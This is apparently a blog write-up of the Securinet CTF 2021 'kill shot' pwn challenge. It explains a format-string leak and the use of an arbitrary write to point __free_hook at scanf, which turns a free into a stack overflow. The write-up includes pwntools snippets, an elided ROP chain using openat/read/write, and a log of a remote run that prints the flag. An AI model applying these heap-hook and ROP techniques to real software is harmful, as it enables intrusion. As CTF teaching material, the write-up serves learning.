---
layout: post
title: kill shot [pwn]
author: hugsy
tags: [pwn, elf64, formatstring, heap]
date: 2021-03-21 20:54 
---

 * Competition: [Securinet CTF Quals 2021](https://www.ctfsecurinets.com/challenges)
 * Challenge Name: kill shot
 * Type: pwn
 * Points: 1000 pts
 * Description: 
 > Let's learn some exploitation!
 >

## Reconnaissance

`kill_shot` is a small ELF64 with all traditional mitigations enabled.
```
$ checksec ./kill_shot
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

In addition, a quick look at it disassembly shows it loads restrictive seccomp rules early in the `main`, which we can dump using [seccomp-tools](https://github.com/david942j/seccomp-tools):
<!--more-->
```
$ seccomp-tools dump ./kill_shot
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x09 0xc000003e  if (A != ARCH_X86_64) goto 0011
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x06 0xffffffff  if (A != 0xffffffff) goto 0011
 0005: 0x15 0x04 0x00 0x00000000  if (A == read) goto 0010
 0006: 0x15 0x03 0x00 0x00000001  if (A == write) goto 0010
 0007: 0x15 0x02 0x00 0x00000005  if (A == fstat) goto 0010
 0008: 0x15 0x01 0x00 0x0000000a  if (A == mprotect) goto 0010
 0009: 0x15 0x00 0x01 0x00000101  if (A != openat) goto 0011
 0010: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0011: 0x06 0x00 0x00 0x00000000  return KILL
```
Only a handful of syscalls are allowed (no `execve` and the like), but enough to read the flag and get it back. This is important mostly for the payload building part, but we're not there yet.
Finally, the challenge gives us the following hint:
```
flag is in /home/ctf/flag.txt
```

## Overview

The runtime operates in 3 steps:
 1. Step 1 gives us a controlled format string after making sure we can't use `%n` to write to arbitrary locations. It is however sufficient to leak everything else we need (libc pointers, exe mapped pointers, etc.) to defeat ASLR.
 2. Step 2 gives a totally arbitray write: we can overwrite 8 bytes at any location of our choosing
 3. Step 3 (last) offers some very basic heap manipulation: we can either create 
    - create new chunks of controlled size and write the content (i.e. `malloc`+`read`)
    - free those chunks (i.e. `free`)

There's no bug is the allocation/free part (such as heap overflow, double free, etc.) and we can only have a maximum of 9 `malloc`-ed chunks.


## Exploit

My original idea was that, since `mprotect` is allowed, the intended purpose is to gain code execution via the arbitrary write, and `mprotect` as `rwx` the heap, when our shellcode would be sitting, doing the typical (`sys_open`, `sys_read`, `sys_write`).
After wasting a few hours on this, I went a totally different way: we can abuse the fact that `malloc` and `free` can be called on demand, to trigger some function to be called as we wish, and with a pointer to a location we control the content, via the `__malloc_hook` and `__free_hook` function pointers.
The issue with the current arbitrary write, is that it allows to gain quickly arbitrary code execution but with little to no control over the rest (registers, stack). So I decided to use `scanf` as target of my arbitrary overwrite: `scanf` is a perfect candidate since we entirely control the format string all we need to find is a stack pointer and write a "%s" at that offset. This would have for effect to change our arbitrary write into a stack overflow (and no canary please).

After a few tests, the 4th offset was a good candidate (i.e. `scanf("%4$s")`), and we fully control $pc and the stack.

![image](https://user-images.githubusercontent.com/590234/111921156-3d931c00-8a50-11eb-8bb0-e1576f72028b.png)

The rest was simply find gadgets from the binary and the libc, enough to open, read the flag file, and write it to stdout.

So to recap, the exploit flow was:
1. use the format string to leak elf base, libc base
2. use the arb, write to overwrite `__free_hook` with `scanf`
```python
    addr = libc.symbols["__free_hook"]
    r.sendafter(b"Pointer: ", str(addr))
    r.sendafter(b"Content: ", p64(libc.symbols["scanf"]))
```
3. allocate a chunk with "%s" inside and free it to trigger a stack bof
```python
    if LOCAL:
        alloc(r, b"/tmp/flag.txt\0", 0x100) # 0
    else:
        alloc(r, b"/home/ctf/flag.txt\0", 0x100) # 0
    alloc(r, b"%4$s") # 1
    free(r, 1)
```

4. now we have a regular stack bof
```python
    rop = flat([
        [...]
        p64(libc.symbols["openat"]),
        [...]
        p64(libc.symbols["read"]),
        [...]
        p64(libc.symbols["write"]),
    ])        
```

When done, we can remotely read the flag:

```bash
$ ./xp.py remote
[+] Opening connection to bin.q21.ctfsecurinets.com on port 1338: Done
[*] step 1: leak stuff
[+] leaked addresses:
0x563765daa240
0x563765da9b10
0x7ffd0d86b5e0
0x169ebea30560a000
0x563765daa240
0x7f85cf4adb97
[+] found elf at 563765da9000
[+] found libc at 7f85cf48c000
[*] step 2: overwrite __free_hook with scanf
[+] overwritten __free_hook
[*] step 3: trigger stack overflow
[*] Switching to interactive mode
flag{this_really_needs_a_kill_shot!_cc5dcc74acd62fa74899efaff22d8f79}\x00\x00\x00\x00\x00\x00\x00\x00
```

My full exploit can be found [here](https://gist.github.com/hugsy/3dae779cf60eb3ecdbe64749855d62cc).
